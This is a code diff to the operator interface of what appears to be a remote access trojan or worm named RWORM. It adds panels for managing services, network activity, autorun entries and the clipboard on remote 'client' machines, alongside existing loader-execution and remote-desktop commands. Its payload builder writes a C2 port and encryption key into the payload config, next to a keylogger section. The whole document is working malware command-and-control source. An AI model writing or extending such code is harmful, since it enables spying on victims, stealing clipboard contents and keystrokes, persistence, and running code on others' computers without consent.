@@ -136,6 +136,10 @@ namespace RWORM.GUI.ViewModels
         public ICommand OpenProcManagerCommand     { get; }
         public ICommand OpenRegistryEditorCommand  { get; }
         public ICommand OpenRemoteDesktopCommand   { get; }
+        public ICommand OpenServiceManagerCommand  { get; }
+        public ICommand OpenNetMonitorCommand      { get; }
+        public ICommand OpenAutorunManagerCommand  { get; }
+        public ICommand OpenClipboardManagerCommand { get; }
         public ICommand LoaderExecCommand          { get; }
         public ICommand LoaderExecFileCommand      { get; }
         public ICommand ClientCloseCommand         { get; }
@@ -196,6 +200,10 @@ namespace RWORM.GUI.ViewModels
             OpenProcManagerCommand    = new RelayCommand(p => OpenProcManager(p as ClientModel));
             OpenRegistryEditorCommand = new RelayCommand(p => OpenRegistryEditor(p as ClientModel));
             OpenRemoteDesktopCommand  = new RelayCommand(p => OpenRemoteDesktop(p as ClientModel));
+            OpenServiceManagerCommand = new RelayCommand(p => OpenServiceManager(p as ClientModel));
+            OpenNetMonitorCommand     = new RelayCommand(p => OpenNetMonitor(p as ClientModel));
+            OpenAutorunManagerCommand = new RelayCommand(p => OpenAutorunManager(p as ClientModel));
+            OpenClipboardManagerCommand = new RelayCommand(p => OpenClipboardManager(p as ClientModel));
             LoaderExecCommand         = new RelayCommand(p => PromptLoaderExec(p as ClientModel));
             LoaderExecFileCommand     = new RelayCommand(p => PromptLoaderExecFile(p as ClientModel));
             ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel));
@@ -432,6 +440,34 @@ namespace RWORM.GUI.ViewModels
             var target = ResolveTargets(c).FirstOrDefault();
             if (target == null) return;
             new RemoteDesktopWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenServiceManager(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ServiceManagerWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenNetMonitor(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new NetMonitorWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenAutorunManager(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new AutorunManagerWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenClipboardManager(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new ClipboardManagerWindow(_server, target.Guid, target.Hostname).Show();
         }
 
         // ── Client control ────────────────────────────────────────────────────
@@ -869,7 +905,7 @@ namespace RWORM.GUI.ViewModels
 
         private static string ResolveRepoRoot()
         {
-            var baseDir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? AppContext.BaseDirectory;
+            var baseDir = AppContext.BaseDirectory;
             string[] candidates = new[]
             {
                 System.IO.Path.Combine(baseDir, "..", "..", "..", ".."),
@@ -1045,6 +1081,9 @@ namespace RWORM.GUI.ViewModels
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"C2Port\s*=\s*\d+",
                     $"C2Port = {BuildPort}");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"EncryptionKey\s*=\s*""[^""]*""",
+                    $"EncryptionKey = \"{BuildEncryptionKey.Replace("\"", "\\\"")}\"");
 
                 // Keylogger
                 cfg = System.Text.RegularExpressions.Regex.Replace(
